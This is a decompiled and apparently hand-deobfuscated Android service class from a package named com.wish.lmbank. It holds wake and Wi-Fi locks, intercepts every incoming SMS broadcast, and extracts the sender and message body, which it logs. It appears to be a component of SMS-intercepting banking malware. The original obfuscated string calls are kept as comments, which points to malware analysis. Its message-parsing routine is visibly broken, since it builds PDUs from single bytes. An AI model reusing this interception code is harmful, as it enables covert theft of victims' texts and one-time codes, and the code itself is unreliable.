package com.wish.lmbank.sms.service;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.telephony.SmsMessage;
import android.text.format.DateFormat;
import android.util.Log;

import java.lang.ref.WeakReference;
import java.util.Date;

import gv00l3ah.mvdt7w.bb7d7pu7;


/* loaded from: cookie_9234504.jar:com/wish/lmbank/sms/service/SmsReceiverServiceV.class */
public class SmsReceiverServiceV extends Service {
    private static final String ACTION_SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String CLASS_TAG = "SmsReceiverServiceV";
    private static PowerManager.WakeLock mStartingService;
    private static final Object mStartingServiceSync = new Object();
    private static WifiManager.WifiLock wifilock;
    private Context mContext;
    private ServiceHandler mServiceHandler;
    private Looper mServiceLooper;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    protected static WifiManager.WifiLock getWifiLock(Context context) {
        WifiManager.WifiLock wifiLock;
        synchronized (SmsReceiverServiceV.class) {
            try {
                if (wifilock == null) {
//                         WifiManager.WifiLock createWifiLock = ((WifiManager) context.getSystemService(bb7d7pu7.m5998("HgAPAA"))).createWifiLock(CLASS_TAG);
                    WifiManager.WifiLock createWifiLock = ((WifiManager) context.getSystemService(Context.WIFI_SERVICE)).createWifiLock(CLASS_TAG);
                    wifilock = createWifiLock;
                    createWifiLock.setReferenceCounted(true);
                }
                wifiLock = wifilock;
            } catch (Throwable th) {
                throw th;
            }
        }
        return wifiLock;
    }

    /* JADX WARN: Multi-variable type inference failed */
    public static SmsMessage[] getMessagesFromIntent(Intent intent) {
//         Object[] objArr = (Object[]) intent.getSerializableExtra(bb7d7pu7.m5998("GQ0cGg"));
        Object[] objArr = (Object[]) intent.getSerializableExtra("pdus");
        if (objArr == null || objArr.length == 0) {
            return null;
        }
        int length = objArr.length;
        byte[] bArr = new byte[length];
        for (int i = 0; i < objArr.length; i++) {
            bArr[i] = (byte) objArr[i];
        }
        byte[] bArr2 = new byte[length];
        SmsMessage[] smsMessageArr = new SmsMessage[length];
        for (int i2 = 0; i2 < length; i2++) {
            bArr2[i2] = bArr[i2];
            smsMessageArr[i2] = SmsMessage.createFromPdu(new byte[]{bArr2[i2]});
        }
        return smsMessageArr;
    }

    public static void beginStartingService(Context context, Intent intent) {
        synchronized (mStartingServiceSync) {
            if (mStartingService == null) {
//                 PowerManager.WakeLock newWakeLock = ((PowerManager) context.getSystemService(bb7d7pu7.m5998("GQYeDBs"))).newWakeLock(1, CLASS_TAG);
                @SuppressLint("InvalidWakeLockTag") PowerManager.WakeLock newWakeLock = ((PowerManager) context.getSystemService(Context.POWER_SERVICE)).newWakeLock(1, CLASS_TAG);
                mStartingService = newWakeLock;
                newWakeLock.setReferenceCounted(false);
            }
            mStartingService.acquire();
            if (!getWifiLock(context).isHeld()) {
                getWifiLock(context).acquire();
            }
            context.startService(intent);
        }
    }

    public static void finishStartingService(Service service, int i) {
        synchronized (mStartingServiceSync) {
            if (mStartingService != null && service.stopSelfResult(i)) {
                mStartingService.release();
            }
        }
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        HandlerThread handlerThread = new HandlerThread(CLASS_TAG, 10);
        handlerThread.start();
        this.mContext = getApplicationContext();
        this.mServiceLooper = handlerThread.getLooper();
        this.mServiceHandler = new ServiceHandler(this, this.mServiceLooper);
    }

    @Override // android.app.Service
    public void onStart(Intent intent, int i) {
        Message obtainMessage = this.mServiceHandler.obtainMessage();
        obtainMessage.arg1 = i;
        obtainMessage.obj = intent;
        this.mServiceHandler.sendMessage(obtainMessage);
    }

    @Override // android.app.Service
    public void onDestroy() {
        this.mServiceLooper.quit();
        super.onDestroy();
    }

    protected void handleSmsReceived(Intent intent) {
        System.out.println("获取");
        String displayMessageBody;
        Bundle extras = intent.getExtras();
        com.wish.lmbank.sms.data.Message message = new com.wish.lmbank.sms.data.Message();
        if (extras != null) {
            SmsMessage[] messagesFromIntent = getMessagesFromIntent(intent);
            if (messagesFromIntent != null) {
                SmsMessage smsMessage = messagesFromIntent[0];
                message.setMessageFrom(smsMessage.getOriginatingAddress());
                message.setMessageDate(new Date(smsMessage.getTimestampMillis()));
                if (messagesFromIntent.length == 1 || smsMessage.isReplace()) {
                    displayMessageBody = smsMessage.getDisplayMessageBody();
                } else {
                    StringBuilder sb = new StringBuilder();
                    for (SmsMessage smsMessage2 : messagesFromIntent) {
                        sb.append(smsMessage2.getMessageBody());
                    }
                    displayMessageBody = sb.toString();
                }
                message.setMessageBody(displayMessageBody);
            }
            StringBuilder sb2 = new StringBuilder();
//                 sb2.append(DateFormat.format(bb7d7pu7.m5998("EBAQEEQkJEQNDTYhIUQEBEQaGg"), new Date()));
            sb2.append(DateFormat.format("yyyy-MM-dd_HH-mm-ss", new Date()));
//                 String m5998 = bb7d7pu7.m5998("SQ");
            String m5998 = " ";
            sb2.append(m5998);
            sb2.append(message.getMessageFrom());
            sb2.append(m5998);
            sb2.append(message.getMessageBody());
//                 Log.i(bb7d7pu7.m5998("GgQaWA"), bb7d7pu7.m5998("GwwKDAAfDA02BBoOU0k") + ((Object) sb2));
            Log.i("sms1", "received_msg: " + sb2);
            return;
        }
    }

    /**
     * 获取短信
     */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/sms/service/SmsReceiverServiceV$ServiceHandler.class */
    private static class ServiceHandler extends Handler {
        private final WeakReference<SmsReceiverServiceV> mSmsReceiverService;

        public ServiceHandler(SmsReceiverServiceV smsReceiverServiceV, Looper looper) {
            super(looper);
            this.mSmsReceiverService = new WeakReference<>(smsReceiverServiceV);
        }

        @Override // android.os.Handler
        public void handleMessage(Message message) {
            SmsReceiverServiceV smsReceiverServiceV = this.mSmsReceiverService.get();
            if (smsReceiverServiceV != null) {
                int i = message.arg1;
                Intent intent = (Intent) message.obj;
                System.out.println("收到");
                if (intent != null) {
//                     if (bb7d7pu7.m5998("CAcNGwYADUcZGwYfAA0MG0c9DAUMGQEGBxBHOiQ6NjssKiwgPywt").equals(intent.getAction())) {
                    if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                        smsReceiverServiceV.handleSmsReceived(intent);
                    }
                }
                SmsReceiverServiceV.finishStartingService(smsReceiverServiceV, i);
            }
        }
    }
}
